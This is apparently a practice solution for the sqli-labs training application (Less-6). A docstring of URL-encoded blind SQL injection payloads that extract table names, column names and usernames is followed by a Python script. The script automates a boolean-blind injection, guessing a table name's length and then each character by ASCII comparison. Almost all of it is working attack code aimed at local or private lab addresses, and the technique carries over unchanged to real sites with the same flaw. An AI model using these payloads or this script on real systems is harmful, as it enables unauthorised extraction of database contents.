'''
http://127.0.0.1/1/Less-6/?id=1%22%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%203,1),2,1))=115%23
http://127.0.0.1/1/Less-6/?id=1%22%20and%20ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%27users%27%20limit%200,1),3,1))=101%23
http://127.0.0.1/1/Less-6/?id=1%22%20and%20ascii(substr((select%20username%20from%20users%20limit%200,1),2,1))=117%23
'''

import requests

url='http://192.168.3.15/sqlib/Less-6/?id=1'


def sqlin(sql,i):
    r = requests.get(sql)
    if 'You are' in r.text:
        return i
    else:
        print(sql)


def get_leng():
    for i in range(1,50):
        payload = '\" and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)={0}--+'.format(i)
        data = sqlin(url+payload,i)
        if data:
            print(data)
            return data

def get_data(loca):
    for i in range(65,123):
        payload = '\" and ascii(substr((select table_name from information_schema.tables  where table_schema=database() limit 3,1),{0},1))={1}--+'.format(loca,i)
        result = sqlin(url+payload,i)
        if result:
            print(chr(result))
            return chr(result)

if __name__ == '__main__':
    data = ''
    length = get_leng()
    for i in range(1,length+1):
        data += get_data(i)
        print(data)

